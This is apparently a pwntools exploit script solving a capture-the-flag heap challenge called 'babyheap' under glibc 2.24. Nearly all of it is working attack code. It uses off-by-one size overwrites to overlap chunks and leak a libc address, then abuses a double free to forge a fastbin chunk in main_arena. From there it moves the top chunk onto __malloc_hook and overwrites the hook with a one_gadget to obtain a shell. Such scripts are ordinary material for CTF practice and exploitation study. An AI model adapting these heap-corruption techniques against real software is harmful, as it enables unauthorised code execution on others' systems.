from pwn import *

p = process('./babyheap', env={"LD_PRELOAD":"libc-2.24.so"})
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(proc.pidof(p)[0], gdbscript='''
                                    continue
                                        ''')
elf = ELF('babyheap')
libc = ELF('./libc-2.24.so')

def alloc(size):
    p.sendlineafter('Command: ', '1')
    p.sendlineafter('Size: ', str(size))

def update(index, size, content):
    p.sendlineafter('Command: ', '2')
    p.sendlineafter('Index: ', str(index))
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', content)

def delete(index):
    p.sendlineafter('Command: ', '3')
    p.sendlineafter('Index: ', str(index))

def view(index):
    p.sendlineafter('Command: ', '4')
    p.sendlineafter('Index: ', str(index))


def solve():
    one_gadgets = [0x45526, 0x4557a, 0xf1651, 0xf24cb]
    alloc(0x58)     # chunk 0
    alloc(0x58)     # chunk 1
    alloc(0x58)     # chunk 2
    alloc(0x58)     # chunk 3
    alloc(0x58)     # chunk 4
    alloc(0x58)     # chunk 5
    alloc(0x58)     # chunk 6

    update(0, 0x59, '\x00'*0x58 + '\x91')
    update(1, 0x59, '\x00'*0x59)
    update(2, 0x29, '\x00'*0x28 + '\x31')

    update(4, 0x59, '\x00'*0x50 + p64(0x90*2+0x60) + '\x90')
    update(5, 0x59, '\x00'*0x59)
    update(6, 0x29, '\x00'*0x28 + '\x31')
    delete(1)       
    delete(5)

    alloc(0x58)     # chunk 1
    view(2)         # allocate chunk 1 push libc leak to chunk 2
    
    libc.address = u64(p.recvline()[10:16] + '\x00\x00') - 0x3c1b58
    main_arena = libc.address + 0x3c1b00
    one_gadget = libc.address + one_gadgets[1]
    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']
    malloc_hook = libc.symbols['__malloc_hook']
    log.info("Libc address: %s" %hex(libc.address))
    log.info("Free hook: %s" % hex(free_hook))
    log.info("Malloc hook: %s" % hex(malloc_hook))
    log.info("Main arena: %s" % hex(main_arena))
    log.info("One gadget: %s" % hex(one_gadget))

    # double free (chunk 5 and chunk 2 are the same but in different fastbins)
    alloc(0x48)     # chunk 5 = chunk 2
    alloc(0x58)     # put value to main_arena to fake fastbin
    delete(7)

    delete(5)
    update(2, 0x8, p64(main_arena+0x25))        # create a fake chunk in main_arena (main_arena stores address of fastbins + top chunk)
    alloc(0x48)
    alloc(0x48)
    
    # overwrite top chunk to malloc_hook -0x23
    update(7, 8*4 + 3 + 8, p64(0)*4 +'\x00'*3 + p64(malloc_hook - 0x23))

    # malloc some chunks to take the unsortedbin
    alloc(0x58)         # chunk 8
    alloc(0x58)         # chunk 9  
    alloc(0x58)         # chunk 10
    alloc(0x38)         # chunk 11

    # no bin available, we can malloc chunk from top chunk => overwrite malloc_hook with one_gadget
    alloc(0x28)
    update(12, 8*2+3 + 8,  p64(0)*2 + '\x00'*3 + p64(one_gadget))
    # one_gadget go brr brr brr
    alloc(0x10)
    p.interactive()

if __name__ == '__main__':
    solve()